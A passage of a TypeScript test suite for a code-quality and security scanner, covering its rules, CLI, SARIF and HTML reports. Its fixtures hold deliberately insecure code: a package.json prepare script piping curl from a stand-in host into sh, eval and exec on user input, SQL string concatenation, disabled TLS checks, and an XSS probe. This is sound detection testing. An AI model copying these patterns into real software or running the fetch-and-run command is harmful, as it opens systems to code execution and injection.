  process.env.NODE_ENV = "test";
  assert.equal(process.env.NODE_ENV, "test");
});

test("snapshot only", () => {
  expect(routeOrder("new", false)).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => routeOrder("new", false));
});

test("setup bloat", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  const four = buildFour();
  const five = buildFive();
  const six = buildSix();
  const seven = buildSeven();
  const eight = buildEight();
  const nine = buildNine();
  const ten = buildTen();
  const eleven = buildEleven();
  const twelve = buildTwelve();
  const thirteen = buildThirteen();
  expect(one).toBeDefined();
});
`,
    "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";

export function renderController(): string {
  return sharedHelper();
}
`,
    "src/cycle/a.ts": `import { fromB } from "./b";

export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";

export function fromB(): string {
  return fromA();
}
`,
    "src/shared/helper.ts": `export function sharedHelper(): string {
  return "shared";
}
`,
    ".env": `API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
PATIENT_SSN=${SSN_FIXTURE_VALUE}
`,
    "package.json": JSON.stringify({
      scripts: {
        postinstall: "node scripts/setup.js",
        prepare: "curl https://example.test/install.sh | sh",
      },
      bin: {
        "missing-cli": "./bin/missing.js",
        "bad-cli": "./bin/bad.js",
      },
      dependencies: {
        "wide-open": "*",
        "remote-tool": "git+https://github.com/example/remote-tool.git",
      },
    }),
    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
    "tsconfig.json": JSON.stringify({
      compilerOptions: {
        strict: false,
        noUncheckedIndexedAccess: false,
        exactOptionalPropertyTypes: false,
      },
    }),
  });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of expandedRuleIds) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  const descriptorIds = new Set(ruleDescriptors().map((descriptor) => descriptor.ruleId));
  for (const ruleId of ruleIds) {
    assert.equal(descriptorIds.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
  }
  assert.equal(new Set(report.findings.map((finding) => finding.fingerprint)).size, report.findings.length);

  const sampleMessages = new Map(report.findings.filter((finding) => expandedRuleIds.has(finding.ruleId)).map((finding) => [finding.ruleId, finding.message]));
  assert.match(sampleMessages.get("security.new-function") ?? "", /dynamic code/);
  assert.match(sampleMessages.get("test-quality.setup-bloat") ?? "", /setup lines/);
  assert.match(sampleMessages.get("sensitive-data.hardcoded-env-value") ?? "", /Redacted preview/);
});

test("rule descriptors cover emitted rules and fixture-backed coverage", () => {
  const descriptors = ruleDescriptors();
  const descriptorIds = descriptors.map((descriptor) => descriptor.ruleId);
  assert.deepEqual(descriptorIds, [...descriptorIds].sort());
  assert.equal(new Set(descriptorIds).size, descriptorIds.length);

  for (const descriptor of descriptors) {
    assert.match(descriptor.ruleId, /^[a-z-]+\.[a-z0-9-]+$/);
    assert.ok(descriptor.description.length > 10, `description for ${descriptor.ruleId}`);
    assert.ok(descriptor.remediation.length > 10, `remediation for ${descriptor.ruleId}`);
    if (descriptor.thresholdKeys) {
      assert.deepEqual(descriptor.thresholdKeys, [...descriptor.thresholdKeys].sort(), `threshold key ordering for ${descriptor.ruleId}`);
      assert.equal(new Set(descriptor.thresholdKeys).size, descriptor.thresholdKeys.length, `threshold key uniqueness for ${descriptor.ruleId}`);
    }
  }

  const coverageIds = ruleCatalogueCoverageRuleIds();
  const descriptorIdSet = new Set(descriptorIds);
  for (const ruleId of coverageIds) {
    assert.equal(descriptorIdSet.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
  }
  for (const descriptor of descriptors) {
    if (descriptor.fixtureExemption) {
      assert.ok(descriptor.fixtureExemption.length > 10, `fixture exemption reason for ${descriptor.ruleId}`);
      continue;
    }
    assert.equal(coverageIds.has(descriptor.ruleId), true, `missing positive fixture coverage for ${descriptor.ruleId}`);
  }
});

test("rule quality doctrine covers risky scanner descriptors", () => {
  const descriptors = new Map(ruleDescriptors().map((descriptor) => [descriptor.ruleId, descriptor]));
  const doctrine = new Map<string, RuleQualityDoctrineCase>(riskyRuleQualityDoctrine.map((entry) => [entry.ruleId, entry]));
  const exceptions = new Map<string, string>(riskyRuleQualityExceptions.map((entry) => [entry.ruleId, entry.reason]));
  const categoryVocabulary = [...RULE_QUALITY_FIXTURE_CATEGORIES].sort();

  for (const ruleId of riskyRuleIdsRequiringNoisyValidProof) {
    const descriptor = descriptors.get(ruleId);
    assert.notEqual(descriptor, undefined, `risky rule has no descriptor: ${ruleId}`);

    const entry = doctrine.get(ruleId);
    const exception = exceptions.get(ruleId);
    assert.equal(Boolean(entry) || Boolean(exception), true, `risky rule missing noisy-valid doctrine or exception: ${ruleId}`);

    if (!entry) {
      assert.ok((exception ?? "").length > 80, `risky rule exception is too terse: ${ruleId}`);
      continue;
    }
    assert.equal(exception, undefined, `risky rule should use doctrine or exception, not both: ${ruleId}`);
    assert.equal(descriptor?.pillar, entry.expectedPillar, `pillar drift for ${ruleId}`);
    assert.equal(descriptor?.severity, entry.expectedSeverity, `severity drift for ${ruleId}`);
    assert.equal(descriptor?.confidence, entry.expectedConfidence, `confidence drift for ${ruleId}`);
    assert.deepEqual([...entry.fixtureCategories].sort(), categoryVocabulary, `fixture vocabulary for ${ruleId}`);

    for (const [field, value] of [
      ["signalSource", entry.signalSource],
      ["invalidFixture", entry.invalidFixture],
      ["noisyValidFixture", entry.noisyValidFixture],
      ["missingInvalidFixture", entry.missingInvalidFixture],
      ["falsePositiveEscapeHatch", entry.falsePositiveEscapeHatch],
      ["fingerprintStability", entry.fingerprintStability],
    ] as const) {
      assert.ok(value.length > 20, `${field} is too terse for ${ruleId}`);
    }
  }
});

test("rule descriptor threshold keys match implementation and config defaults", () => {
  const descriptors = ruleDescriptors();
  const descriptorThresholds = new Map(
    descriptors.filter((descriptor) => (descriptor.thresholdKeys ?? []).length > 0).map((descriptor) => [descriptor.ruleId, [...(descriptor.thresholdKeys ?? [])].sort()]),
  );
  const implementationSources = ["src/cli.ts", "src/sensitive-data-rules.ts"].map((path) => readFileSync(path, "utf8")).join("\n");
  const implementationThresholds = thresholdUsages(implementationSources);
  assert.deepEqual(descriptorThresholds, implementationThresholds);

  const configThresholds = yamlThresholdDefaults(readFileSync(".gruff.yaml", "utf8"));
  assert.deepEqual(configThresholds, descriptorThresholds);
  for (const [ruleId, keys] of configThresholds) {
    assert.deepEqual(descriptorThresholds.get(ruleId), keys, `config threshold keys for ${ruleId}`);
  }
});

test("root CLI exposes gruff console command and option parity", () => {
  const list = execFileSync("./bin/gruff-ts", [], { encoding: "utf8" });
  const help = execFileSync("./bin/gruff-ts", ["--help"], { encoding: "utf8" });
  const explicitList = execFileSync("./bin/gruff-ts", ["list"], { encoding: "utf8" });

  assert.equal(help, list);
  assert.equal(explicitList, list);
  assert.match(list, /^gruff-ts 0\.1\.0\n\nUsage:\n  command \[options\] \[arguments\]/);
  for (const option of ["-h, --help", "--silent", "-q, --quiet", "-V, --version", "--ansi|--no-ansi", "-n, --no-interaction", "-v|vv|vvv, --verbose"]) {
    assert.match(list, new RegExp(option.replace(/[|]/g, "\\|")));
  }
  for (const command of ["analyse", "completion", "dashboard", "help", "list", "list-rules", "report", "summary"]) {
    assert.match(list, new RegExp(`^  ${command}\\s+`, "m"));
  }
});

test("root CLI mirrors gruff php ANSI menu styling", () => {
  const ansiMenu = execFileSync("./bin/gruff-ts", ["--ansi"], { encoding: "utf8" });
  const plainMenu = execFileSync("./bin/gruff-ts", ["--no-ansi"], { encoding: "utf8" });

  assert.match(ansiMenu, /gruff-ts \u001b\[32m0\.1\.0\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[33mUsage:\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[33mOptions:\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[32m-h, --help\u001b\[39m/);
  assert.match(ansiMenu, /display help for the \u001b\[32mlist\u001b\[39m command/i);
  assert.match(ansiMenu, /\u001b\[33mAvailable commands:\u001b\[39m/);
  assert.match(ansiMenu, /\u001b\[32manalyse\u001b\[39m/);
  assert.equal(/\u001b\[[0-9;]*m/.test(plainMenu), false);
});

test("list-rules CLI prints text and deterministic json", () => {
  const text = execFileSync("./bin/gruff-ts", ["list-rules"], { encoding: "utf8" });
  assert.match(text, /gruff-ts 0\.1\.0 rules \(\d+\)/);
  assert.match(text, /security\.eval-call \| security \| error \| high \|/);
  assert.match(text, /complexity\.npath \| complexity \| warning \| medium \| .*thresholds: error,warn/);

  const firstJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
  const secondJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
  assert.equal(firstJsonText, secondJsonText);
  const parsed = JSON.parse(firstJsonText) as {
    schemaVersion?: string;
    tool?: { name?: string; version?: string };
    rules?: Array<{ ruleId?: string; pillar?: string; severity?: string; confidence?: string; description?: string; thresholdKeys?: string[] }>;
  };
  assert.equal(parsed.schemaVersion, undefined);
  assert.equal(parsed.tool?.name, "gruff-ts");
  assert.equal(parsed.rules?.some((rule) => rule.ruleId === "design.deep-relative-import" && rule.thresholdKeys?.includes("maxParentSegments")), true);
});

test("console globals suppress normal output and completion emits a script", () => {
  const quietRules = execFileSync("./bin/gruff-ts", ["--quiet", "list-rules"], { encoding: "utf8" });
  assert.equal(quietRules, "");

  const completion = execFileSync("./bin/gruff-ts", ["completion"], { encoding: "utf8" });
  assert.match(completion, /complete -F _gruff_ts_completion gruff-ts/);
  assert.match(completion, /commands="analyse completion dashboard list list-rules report summary"/);
  assert.match(completion, /text json html markdown github hotspot sarif/);

  const analyseHelp = execFileSync("./bin/gruff-ts", ["analyse", "--help"], { encoding: "utf8" });
  assert.match(analyseHelp, /sarif/);
});

test("summary CLI prints compact scan digest without per-finding spam", () => {
  const output = execFileSync("./bin/gruff-ts", ["summary", "fixtures/sample.ts", "--fail-on=none", "--no-config", "--no-baseline"], { encoding: "utf8" });
  assert.match(output, /^gruff-ts 0\.1\.0 summary/);
  assert.match(output, /Per-pillar counts:/);
  assert.match(output, /Top rules:/);
  assert.match(output, /Top file offenders:/);
  assert.equal(output.includes("Findings:\n- ["), false);
});

test("json report uses schema version", () => {
  const report = analyse({
    paths: [],
    noConfig: true,
    format: "json",
    failOn: "none",
    includeIgnored: false,
    noBaseline: true,
  });
  const rendered = renderReport(report, "json");
  assert.match(rendered, /"schemaVersion": "gruff\.analysis\.v1"/);
});

test("sarif report renders code scanning contract without mutating native json schema", () => {
  const report: AnalysisReport = {
    schemaVersion: "gruff.analysis.v1",
    tool: { name: "gruff-ts", version: "0.1.0-test" },
    run: { projectRoot: "/tmp/project", format: "sarif", failOn: "none", generatedAt: "2026-05-15T00:00:00.000Z" },
    summary: { advisory: 1, warning: 1, error: 1, total: 3 },
    paths: { analysedFiles: 1, ignoredPaths: [], missingPaths: [] },
    diagnostics: [],
    findings: [
      {
        ruleId: "security.eval-call",
        message: "Avoid eval().",
        filePath: "./src\\bad.ts",
        line: 7,
        endLine: 10,
        column: 3,
        severity: "error",
        pillar: "security",
        secondaryPillars: ["sensitive-data"],
        tier: "v0.1",
        confidence: "high",
        symbol: "run",
        remediation: "Use a dispatch table.",
        metadata: { target: "eval" },
        fingerprint: "abc123",
      },
      {
        ruleId: "waste.console-log",
        message: "Avoid console logging.",
        filePath: "src\\warn.ts",
        line: 8,
        severity: "warning",
        pillar: "waste",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "high",
        metadata: {},
        fingerprint: "def456",
      },
      {
        ruleId: "docs.missing-public-doc",
        message: "Document public exports.",
        filePath: "./src/docs.ts",
        line: 9,
        severity: "advisory",
        pillar: "documentation",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "medium",
        metadata: { exported: true },
        fingerprint: "ghi789",
      },
    ],
    score: {
      composite: 91,
      grade: "A",
      pillars: [{ pillar: "security", score: 91, findings: 1 }],
      topOffenders: [{ filePath: "src/bad.ts", score: 91, findings: 1 }],
    },
  };

  const beforeSarif = JSON.stringify(report);
  const payload = JSON.parse(renderReport(report, "sarif"));
  assert.equal(JSON.stringify(report), beforeSarif);
  const rules = payload.runs[0].tool.driver.rules as Array<{
    id: string;
    name: string;
    shortDescription: { text: string };
    fullDescription: { text: string };
    help: { text: string };
    properties: Record<string, unknown>;
  }>;
  const descriptors = ruleDescriptors();
  const ruleIds = rules.map((rule) => rule.id);
  const results = payload.runs[0].results;
  const result = results[0];
  const evalDescriptor = descriptors.find((descriptor) => descriptor.ruleId === "security.eval-call");
  const evalRule = rules.find((rule) => rule.id === "security.eval-call");

  assert.equal(payload.version, "2.1.0");
  assert.equal(payload.runs[0].tool.driver.name, "gruff-ts");
  assert.equal(payload.runs[0].tool.driver.semanticVersion, "0.1.0-test");
  assert.deepEqual(ruleIds, [...ruleIds].sort());
  assert.deepEqual(ruleIds, descriptors.map((descriptor) => descriptor.ruleId));
  assert.ok(evalDescriptor);
  assert.ok(evalRule);
  assert.equal(evalRule.name, evalDescriptor.ruleId);
  assert.equal(evalRule.shortDescription.text, evalDescriptor.description);
  assert.equal(evalRule.fullDescription.text, evalDescriptor.description);
  assert.equal(evalRule.help.text, evalDescriptor.remediation);
  assert.equal(evalRule.properties.pillar, evalDescriptor.pillar);
  assert.equal(evalRule.properties.defaultSeverity, evalDescriptor.severity);
  assert.equal(evalRule.properties.confidence, evalDescriptor.confidence);
  assert.equal(evalRule.properties.defaultEnabled, true);
  for (const sarifResult of results) {
    assert.equal(rules[sarifResult.ruleIndex]?.id, sarifResult.ruleId);
    assert.equal(typeof sarifResult.partialFingerprints.gruffFingerprint, "string");
    assert.equal("primary" in sarifResult.partialFingerprints, false);
    assert.equal("codeFlows" in sarifResult, false);
    assert.equal("threadFlows" in sarifResult, false);
    assert.equal("fixes" in sarifResult, false);
    assert.equal("relatedLocations" in sarifResult, false);
    assert.equal("suppressions" in sarifResult, false);
  }
  assert.equal(result.ruleId, "security.eval-call");
  assert.equal(result.ruleIndex, ruleIds.indexOf("security.eval-call"));
  assert.equal(result.level, "error");
  assert.equal(result.message.text, "Avoid eval().");
  assert.equal(result.locations[0].physicalLocation.artifactLocation.uri, "src/bad.ts");
  assert.equal(result.locations[0].physicalLocation.region.startLine, 7);
  assert.equal(result.locations[0].physicalLocation.region.startColumn, 3);
  assert.equal(result.locations[0].physicalLocation.region.endLine, 10);
  assert.equal(result.partialFingerprints.gruffFingerprint, "abc123");
  assert.equal(result.properties.severity, "error");
  assert.equal(result.properties.pillar, "security");
  assert.deepEqual(result.properties.secondaryPillars, ["sensitive-data"]);
  assert.equal(result.properties.symbol, "run");
  assert.equal(result.properties.remediation, "Use a dispatch table.");
  assert.equal(result.properties.metadata.target, "eval");
  assert.equal(results[1].level, "warning");
  assert.equal(results[1].locations[0].physicalLocation.artifactLocation.uri, "src/warn.ts");
  assert.equal(results[1].properties.severity, "warning");
  assert.deepEqual(results[1].properties.metadata, {});
  assert.equal(results[2].level, "note");
  assert.equal(results[2].locations[0].physicalLocation.artifactLocation.uri, "src/docs.ts");
  assert.equal(results[2].properties.severity, "advisory");
  assert.equal(payload.runs[0].properties.gruffSchemaVersion, "gruff.analysis.v1");
  assert.equal(payload.runs[0].properties.generatedAt, "2026-05-15T00:00:00.000Z");
  assert.equal(payload.runs[0].properties.score, 91);
  assert.equal(payload.runs[0].properties.grade, "A");
  assert.equal(JSON.parse(renderReport(report, "json")).schemaVersion, "gruff.analysis.v1");
  assert.equal(JSON.stringify(report), beforeSarif);
});

test("analyse CLI emits parseable sarif for both format syntaxes", () => {
  for (const formatArgs of [
    ["--format", "sarif"],
    ["--format=sarif"],
  ] as const) {
    const output = execFileSync("./bin/gruff-ts", ["analyse", "fixtures/sample.ts", ...formatArgs, "--fail-on=none", "--no-config", "--no-baseline"], { encoding: "utf8" });
    const payload = JSON.parse(output);
    const rules = payload.runs[0].tool.driver.rules;
    const ruleIds = rules.map((rule: { id: string }) => rule.id);
    const results = payload.runs[0].results;

    assert.equal(payload.version, "2.1.0");
    assert.equal(payload.runs.length, 1);
    assert.equal(payload.runs[0].tool.driver.name, "gruff-ts");
    assert.equal(payload.runs[0].tool.driver.semanticVersion, "0.1.0");
    assert.deepEqual(ruleIds, [...ruleIds].sort());
    assert.equal(results.length > 0, true);
    for (const sarifResult of results) {
      assert.equal(typeof sarifResult.partialFingerprints.gruffFingerprint, "string");
      if ("ruleIndex" in sarifResult) {
        assert.equal(rules[sarifResult.ruleIndex].id, sarifResult.ruleId);
      }
      const uri = sarifResult.locations[0].physicalLocation.artifactLocation.uri;
      assert.equal(uri.startsWith("./"), false);
      assert.equal(uri.includes("\\"), false);
    }
  }
});

test("sarif fail-on preserves error exit behavior", () => {
  const dir = mkdtempSync(join(tmpdir(), "gruff-ts-sarif-fail-on-"));
  try {
    const target = join(dir, "bad.ts");
    writeFileSync(
      target,
      `export function run(source: string): unknown {
  return eval(source);
}
`,
    );

    const result = spawnSync("./bin/gruff-ts", ["analyse", target, "--format", "sarif", "--fail-on", "error", "--no-config", "--no-baseline"], { encoding: "utf8" });
    assert.equal(result.status, 1);
    assert.equal(result.stderr, "");
    const payload = JSON.parse(result.stdout);
    assert.equal(payload.version, "2.1.0");
    assert.equal(payload.runs[0].results.some((sarifResult: { ruleId?: string }) => sarifResult.ruleId === "security.eval-call"), true);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("html report uses dashboard parity anchors and escapes values", () => {
  const report: AnalysisReport = {
    schemaVersion: "gruff.analysis.v1",
    tool: { name: "gruff-ts", version: "0.1.0-test<script>" },
    run: { projectRoot: "/tmp/project", format: "html", failOn: "none", generatedAt: "2026-05-15T00:00:00.000Z" },
    summary: { advisory: 0, warning: 1, error: 1, total: 2 },
    paths: { analysedFiles: 1, ignoredPaths: [], missingPaths: [] },
    diagnostics: [],
    findings: [
      {
        ruleId: "docs.<script>",
        message: "Message with <script>alert(1)</script>",
        filePath: "src/<bad>.ts",
        line: 7,
        severity: "warning",
        pillar: "documentation",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "high",
        symbol: "badSymbol",
        metadata: {},
        fingerprint: "abc123",
      },
      {
        ruleId: "complexity.cyclomatic",
        message: "Function has cyclomatic complexity 12.",
        filePath: "src/Complex.ts",
        line: 11,
        severity: "error",
        pillar: "complexity",
        secondaryPillars: [],
        tier: "v0.1",
        confidence: "high",
        symbol: "run",
        metadata: {},
        fingerprint: "def456",
      },
    ],
    score: {
      composite: 82.5,
      grade: "B",
      pillars: [{ pillar: "documentation", score: 84, findings: 1 }],
      topOffenders: [{ filePath: "src/<bad>.ts", score: 88, findings: 1 }],
    },
  };

  const rendered = renderReport(report, "html");

  for (const anchor of ["paper", "masthead", "wordmark", "verdict", "grade-stamp", "pillar-grid", "offender-list", "chart-section", "finding"]) {
    assert.match(rendered, new RegExp(`class="${anchor}`));
  }
  assert.match(rendered, /gruff-ts/);
  assert.match(rendered, /ts\/js code quality/);
  assert.match(rendered, /src\/&lt;bad&gt;\.ts/);
  assert.match(rendered, /docs\.&lt;script&gt;/);
  assert.match(rendered, /Message with &lt;script&gt;alert\(1\)&lt;\/script&gt;/);
  assert.equal(rendered.includes("0.1.0-test<script>"), false);
  assert.equal(rendered.includes("src/<bad>.ts"), false);
  assert.equal(rendered.includes("<script>alert(1)</script>"), false);
});

test("html report rendering does not mutate json report output", () => {
  const report = analyseFixture(`export function process(value: string): string {
  return value;
}
`);
  const before = renderReport(report, "json");

  renderReport(report, "html");

  assert.equal(renderReport(report, "json"), before);
  assert.match(before, /"schemaVersion": "gruff\.analysis\.v1"/);
});

test("dashboard root uses parity shell and escapes controls", async () => {
  const projectRoot = mkdtempSync(join(tmpdir(), "gruff-ts-dashboard-<bad>-"));
  try {
    writeFileSync(join(projectRoot, "sample.ts"), `export function sample(): string {
  return "ok";
}
`);
    await withDashboard(projectRoot, async (baseUrl) => {
      const rootHtml = await fetchText(`${baseUrl}/?projectRoot=${encodeURIComponent(projectRoot)}&path=sample.ts`);
      for (const anchor of ["controls-toggle", "controls-panel", "report-frame", "scan-form"]) {
        assert.match(rootHtml, new RegExp(`class="${anchor}`));
      }
      assert.match(rootHtml, /Project root/);
      assert.match(rootHtml, /Paths/);
      assert.match(rootHtml, /&lt;bad&gt;/);
      assert.match(rootHtml, /src="\/scan\?projectRoot=/);
      assert.equal(rootHtml.includes("<bad>"), false);
    });
  } finally {
    rmSync(projectRoot, { recursive: true, force: true });
  }
});

test("dashboard scan returns report shell with escaped dashboard context", async () => {
  const projectRoot = mkdtempSync(join(tmpdir(), "gruff-ts-dashboard-<bad>-"));
  try {
    writeFileSync(join(projectRoot, "sample.ts"), `export function sample(): string {
  return "ok";
}
`);
    await withDashboard(projectRoot, async (baseUrl) => {
      const scanHtml = await fetchText(`${baseUrl}/scan?projectRoot=${encodeURIComponent(projectRoot)}&path=sample.ts`);
      assert.match(scanHtml, /class="paper"/);
      assert.match(scanHtml, /class="dashboard-context"/);
      assert.match(scanHtml, /Project root/);
      assert.match(scanHtml, /sample\.ts/);
      assert.match(scanHtml, /&lt;bad&gt;/);
      assert.equal(scanHtml.includes("<bad>"), false);
    });
  } finally {
    rmSync(projectRoot, { recursive: true, force: true });
  }
});

interface AnalyseProjectOptions {
  config?: Record<string, unknown>;
  configPath?: string;
  executableFiles?: string[];
  includeIgnored?: boolean;
  noConfig?: boolean;
  paths?: string[];
}

interface AnalyseFixtureOptions extends AnalyseProjectOptions {
  fileName?: string;
}

function analyseFixture(source: string, options: AnalyseFixtureOptions = {}) {
  return analyseProject(
    { [options.fileName ?? "bad.ts"]: source },
    {
      ...(options.config ? { config: options.config } : {}),
      ...(typeof options.configPath === "string" ? { configPath: options.configPath } : {}),
      ...(typeof options.noConfig === "boolean" ? { noConfig: options.noConfig } : {}),
    },
  );
}

function analyseProject(files: Record<string, string>, options: AnalyseProjectOptions = {}) {
  const dir = mkdtempSync(join(tmpdir(), "gruff-ts-"));
  const previous = cwd();
  try {
    writeFixtureFiles(dir, files);
    for (const fileName of options.executableFiles ?? []) {
      chmodSync(join(dir, fileName), 0o755);
    }
    if (options.config) {
      writeFileSync(join(dir, ".gruff.json"), JSON.stringify(options.config));
    }
    chdir(dir);
    return analyse({
      paths: options.paths ?? ["."],
      ...(typeof options.configPath === "string" ? { config: options.configPath } : {}),
      noConfig: options.noConfig ?? !(options.config || options.configPath),
      format: "json",
      failOn: "none",
      includeIgnored: options.includeIgnored ?? false,
      noBaseline: true,
    });
  } finally {
    chdir(previous);
    rmSync(dir, { recursive: true, force: true });
  }
}

function writeFixtureFiles(dir: string, files: Record<string, string>): void {
  for (const [fileName, source] of Object.entries(files)) {
    const path = join(dir, fileName);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, source);
  }
}

function evalFindingFiles(report: AnalysisReport): Set<string> {
  return new Set(report.findings.filter((finding) => finding.ruleId === "security.eval-call").map((finding) => finding.filePath));
}

function gitAvailable(): boolean {
  try {
    execFileSync("git", ["--version"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

function isGitIgnoredByGit(projectRoot: string, path: string): boolean {
  try {
    execFileSync("git", ["check-ignore", "--quiet", path], { cwd: projectRoot });
    return true;
  } catch (error) {
    const status = typeof error === "object" && error !== null && "status" in error ? (error as { status?: unknown }).status : undefined;
    if (status === 1) {
      return false;
    }
    throw error;
  }
}

async function withDashboard(projectRoot: string, run: (baseUrl: string) => Promise<void>): Promise<void> {
  const port = await freePort();
  const child = spawn("./bin/gruff-ts", ["dashboard", "--host", "127.0.0.1", "--port", String(port), "--project-root", projectRoot], {
    cwd: REPO_ROOT,
    stdio: ["ignore", "pipe", "pipe"],
  });
  let output = "";
  child.stdout.setEncoding("utf8");
  child.stderr.setEncoding("utf8");
  child.stdout.on("data", (chunk: string) => {
    output += chunk;
  });
  child.stderr.on("data", (chunk: string) => {
    output += chunk;
  });
  const baseUrl = `http://127.0.0.1:${port}`;
  try {
    await waitForUrl(`${baseUrl}/health`, output);
    await run(baseUrl);
  } finally {
    child.kill();
    await new Promise<void>((resolve) => {
      if (child.exitCode !== null || child.signalCode !== null) {
        resolve();
        return;
      }
      child.once("exit", () => resolve());
      setTimeout(resolve, 1000);
    });
  }
}

async function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const server = createNetServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (typeof address !== "object" || address === null) {
        server.close();
        reject(new Error("unable to allocate dashboard test port"));
        return;
      }
      const { port } = address;
      server.close(() => resolve(port));
    });
  });
}

async function waitForUrl(url: string, output: string): Promise<void> {
  const deadline = Date.now() + 5000;
  const processOutput = output;
  let lastError: unknown;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(url);
      if (response.ok) {
        return;
      }
      lastError = new Error(`HTTP ${response.status}`);
    } catch (error) {
      lastError = error;
    }
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error(`timed out waiting for ${url}: ${String(lastError)}\n${processOutput}`);
}

async function fetchText(url: string): Promise<string> {
  const response = await fetch(url);
  const text = await response.text();
  assert.equal(response.ok, true, `${url} returned ${response.status}: ${text}`);
  return text;
}

function ruleCatalogueCoverageRuleIds(): Set<string> {
  const report = analyseProject(
    {
      "src/catalogue.ts": `import { createHash } from "node:crypto";
import { exec, spawn } from "node:child_process";
import { unusedThing } from "./dep";

// TODO: collapse this coverage fixture when generated rule docs exist.
// ${COMMENTED_OUT_LEGACY_CALL}
const data1 = "placeholder";
const strName = "Ada";
const active = true;
const xx = 1;
const unsafeAny: any = {};
const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";
const maybeUser = { name: strName };
const optionalName = maybeUser && maybeUser.name;
const fallbackName = maybeUser.name || "anonymous";
var legacyName = fallbackName;

export type PublicAny = any;

export class WrongName {
  public status = "ready";
  private count: number;

  public constructor() {
    this.count = xx;
  }

  private hidden(): void {
    console.log(this.count);
  }
}

export function process(flag: boolean, userInput: string, userId: string, userIds: string[], unusedFlag: boolean): string {
  eval(userInput);
  new Function(userInput)();
  setTimeout("alert(1)", 10);
  window.setInterval("alert(1)", 10);
  exec(userInput);
  spawn(userInput, []);
  Math.random();
  document.write(userInput);
  element.innerHTML = userInput;
  element.dangerouslySetInnerHTML = { __html: userInput };
  element.__proto__ = {};
  createHash("md5").update(userInput);
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
  const insecureAgent = { rejectUnauthorized: false, minVersion: "TLSv1" };
  location.href = "javascript:alert(1)";
  db.query("SELECT * FROM users WHERE id = " + userId);
  const timestamp = new Date().getTime();
  const copy = Object.assign({}, { userId });
  if (!!userId) {
    observe(copy);
  }
  if (userId == "legacy") {
    observe(timestamp);
  }
  userIds.forEach(async (id) => {
    await sendEmailAsync(id);
  });
  sendEmailAsync(userIds[0]);
  try {
    riskyWork();
  } catch (error) {
    throw error;
  }
  try {
    riskyWork();
  } catch (error) {
    // ignored
  }
  if (flag) {
    if (userId) {
      return optionalName;
    }
  } else if (legacyName) {
    return legacyName;
  }
  if (userId === "a") {
    return "a";
  }
  if (userId === "b") {
    return "b";
  }
  if (userId === "c") {
    return "c";
  }
  if (userId === "d") {
    return "d";
  }
  if (userId === "e") {
    return "e";
  }
  if (userId === "f") {
    return "f";
  }
  if (userId === "g") {
    return "g";
  }
  if (userId === "h") {
    return "h";
  }
  if (userId === "i") {
    return "i";
  }
  void insecureAgent;
  throw "dynamic failure";
  console.log(unsafeAny);
}

function finish(): void {
  doWork();
  return;
}

function emptyWork(): void {}

function redundantResult(): string {
  const calculated = fallbackName;
  return calculated;
}

/**
 * score amount
 * @param stale Removed parameter.
 */
export function scoreAmount(amount: number): number {
  return amount + redundantResult().length;
}

export function unsafePublicApi(input: any): any {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as unknown as { name?: string };
  return user!.name;
}
`,
      "src/dep.ts": `export const usedThing = "used";
`,
      "src/catalogue.test.ts": `import assert from "node:assert/strict";

function renderCatalogue(): string {
  return "catalogue";
}

test("no assertion", () => {
  const value = renderCatalogue();
});

test("trivial assertion", () => {
  assert.equal(1, 1);
});

test("snapshot only", () => {
  expect(renderCatalogue()).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => renderCatalogue());
});

test("magic assertion", () => {
  const total = 7;
  expect(total).toBe(42);
});

test("unused mock", () => {
  const unusedMock = jest.fn();
  assert.ok(true);
});

test("mock only", () => {
  const serviceMock = vi.fn();
  serviceMock();
  expect(serviceMock).toHaveBeenCalled();
});

test("exception type only", () => {
  expect(() => fail()).toThrow(Error);
});

test("global mutation", () => {
  process.env.NODE_ENV = "test";
  assert.equal(process.env.NODE_ENV, "test");
});

test("setup bloat and control flow", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  if (one) {
    for (const item of [one, two, three]) {
      sleep(item);
    }
  }
  setTimeout(() => undefined, 1);
  test.only("nested focus marker", () => undefined);
  assert.equal(one, one);
});
`,
      "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";

export function renderController(): string {
  return sharedHelper();
}
`,
      "src/cycle/a.ts": `import { fromB } from "./b";

export function fromA(): string {
  return fromB();
}
`,
      "src/cycle/b.ts": `import { fromA } from "./a";

export function fromB(): string {
  return fromA();
}
`,
      "src/shared/helper.ts": `export function sharedHelper(): string {
  return "shared";
}
`,
      "src/untested.ts": `export function untestedValue(): string {
  return "untested";
}
`,
      ".env": `AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_FIXTURE_VALUE}
